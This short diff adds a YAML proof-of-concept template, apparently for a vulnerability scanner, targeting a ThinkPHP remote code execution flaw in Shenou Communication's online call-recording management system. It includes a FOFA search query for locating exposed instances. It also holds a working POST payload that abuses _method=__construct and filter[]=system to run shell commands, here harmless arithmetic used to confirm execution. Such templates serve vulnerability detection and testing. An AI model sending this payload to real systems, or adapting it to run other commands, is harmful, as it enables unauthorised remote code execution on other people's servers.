@@ -1,0 +1,20 @@
+id: poc-yaml-shenou-communication-index-rce
+info:
+  name: 申瓯通信 在线录音管理系统 Thinkphp 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 在线录音管理系统
+  fofa: title="在线录音管理系统"
+variables:
+  t1: random_int(1000,999000)
+  t2: random_int(100,1000)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /callcenter/public/index.php/index.php?s=index/index/index
+  headers:
+    Content-type: application/x-www-form-urlencoded
+  data: s=set%20/a%20{{.t1}}%20-%20{{.t2}}%26expr%20{{.t1}}%20-%20{{.t2}}&_method=__construct&method=POST&filter[]=system
+  expression: "status_code == 302 && \ntrim(body) == t3\n"
+transport: http
